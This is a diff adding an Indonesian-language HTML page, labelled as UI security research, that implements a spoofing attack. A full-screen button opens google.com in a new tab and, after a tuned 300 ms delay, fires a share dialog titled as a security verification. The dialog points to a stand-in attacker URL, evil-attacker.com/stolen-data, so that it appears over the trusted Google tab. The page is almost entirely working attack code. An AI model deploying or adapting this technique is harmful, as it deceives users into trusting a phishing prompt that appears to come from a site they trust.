@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penelitian Keamanan UI</title>
+    <style>
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
+        #overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; z-index: 9999;
+        }
+        .btn { padding: 20px 40px; background: #1a73e8; color: white; border-radius: 8px; font-weight: bold; font-size: 1.2rem; }
+    </style>
+</head>
+<body>
+
+    <div id="overlay">
+        <div class="btn">Lanjutkan ke Google</div>
+    </div>
+
+    <script>
+        const overlay = document.getElementById('overlay');
+
+        overlay.addEventListener('click', async () => {
+            // 1. Target Tab (Situs yang dipercaya pengguna)
+            const targetUrl = 'https://www.google.com';
+
+            // 2. Siapkan data Share (Ini akan memicu Dialog Sistem)
+            const shareData = {
+                title: 'Verifikasi Keamanan',
+                text: 'Kirim kode verifikasi ke perangkat Anda?',
+                url: 'https://evil-attacker.com/stolen-data'
+            };
+
+            // 3. Teknik "The Switch": 
+            // Kita buka tab baru terlebih dahulu
+            window.open(targetUrl, '_blank');
+
+            // 4. Memicu dialog share dengan sedikit delay (Race Condition)
+            // Delay ini disesuaikan agar dialog muncul DI ATAS tab Google
+            setTimeout(async () => {
+                try {
+                    if (navigator.share) {
+                        await navigator.share(shareData);
+                    }
+                } catch (err) {
+                    console.log('Dialog dibatalkan atau diblokir sistem');
+                }
+            }, 300); // 300ms adalah sweet spot untuk transisi tab Android
+        });
+    </script>
+</body>
+</html>
